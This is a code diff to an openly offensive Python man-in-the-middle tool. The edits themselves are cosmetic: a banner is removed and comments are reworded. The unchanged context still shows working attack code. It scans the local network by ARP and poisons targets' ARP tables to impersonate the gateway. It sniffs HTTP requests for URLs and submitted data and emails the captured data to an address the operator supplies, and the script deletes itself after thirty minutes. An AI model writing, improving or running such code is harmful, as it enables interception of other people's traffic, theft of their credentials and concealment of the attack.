@@ -6,20 +6,7 @@ import scapy.all as scapy
 from scapy.layers.http import HTTPRequest
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-
-# Function to display banner
-def display_banner():
-    banner = """
-    ███████╗██╗██████╗ ███████╗██████╗ ██████╗ ███████╗
-    ██╔════╝██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝
-    █████╗  ██║██████╔╝██████╗  ██████╔╝██║  ██║██████╗
-    ██╔══╝  ██║██╔══██╗╚════██╗ ██╔══██╗██║  ██║╚════██╗
-    ███████╗██║██║  ██║██████╔╝ ██║  ██║██████╔╝██████╔╝
-    ╚══════╝╚═╝╚═╝  ╚═╝╚═════╝  ╚═╝  ╚═╝╚═════╝ ╚═════╝
-    
-    Create by ErrorMask
-    """
-    print(banner)
+import threading
 
 # Function to send email with captured data
 def send_email(subject, body, to_email, from_email, password):
@@ -40,7 +27,7 @@ def send_email(subject, body, to_email, from_email, password):
     except Exception as e:
         print(f"[!] Error sending email: {str(e)}")
 
-# Function to scan network
+# Function to scan network and retrieve active clients
 def scan_network(ip_range):
     print("[*] Scanning network...")
     arp_request = scapy.ARP(pdst=ip_range)
@@ -53,7 +40,7 @@ def scan_network(ip_range):
         clients.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
     return clients
 
-# Function for ARP spoofing
+# Function to perform ARP spoofing
 def spoof(target_ip, gateway_ip):
     target_mac = get_mac(target_ip)
     if target_mac is None:
@@ -62,14 +49,14 @@ def spoof(target_ip, gateway_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
     scapy.send(packet, verbose=False)
 
-# Function to restore ARP tables
+# Function to restore ARP tables to their original state
 def restore(target_ip, gateway_ip):
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
     scapy.send(packet, count=4, verbose=False)
 
-# Function to get MAC address from IP
+# Function to retrieve MAC address from an IP address
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -79,11 +66,11 @@ def get_mac(ip):
         return None
     return answered_list[0][1].hwsrc
 
-# Function to sniff packets
+# Function to sniff network packets
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet)
 
-# Function to process the packets
+# Function to process captured packets and extract HTTP request data
 def process_packet(packet):
     if packet.haslayer(HTTPRequest):
         url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
@@ -98,7 +85,7 @@ def process_packet(packet):
             body = f"URL: {url}\nDATA: {load}\n"
             send_email(subject, body, email_to, email_from, email_password)
 
-# Auto-remove function after 30 minutes
+# Function to auto-remove script after 30 minutes
 def auto_remove():
     print("[*] Script will auto-remove after 30 minutes.")
     time.sleep(1800)  # Wait for 30 minutes (1800 seconds)
@@ -106,15 +93,11 @@ def auto_remove():
     os.remove(sys.argv[0])
     sys.exit()
 
-# Main function
+# Main function to initiate MITM attack
 def main():
     global email_from, email_password, email_to
     
-    # Display the banner when the script starts
-    display_banner()
-
-    print("[*] Starting MITM Tool...")
-
+    # Prompt user for necessary inputs
     email_from = input("[?] Enter your Gmail address (sender): ")
     email_password = input("[?] Enter your Gmail password: ")
     email_to = input("[?] Enter the email address to receive data: ")
@@ -128,7 +111,6 @@ def main():
         print("[*] Launching MITM attack...")
         
         # Start the auto-remove function in a separate thread
-        import threading
         threading.Thread(target=auto_remove, daemon=True).start()
         
         while True:
@@ -145,3 +127,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
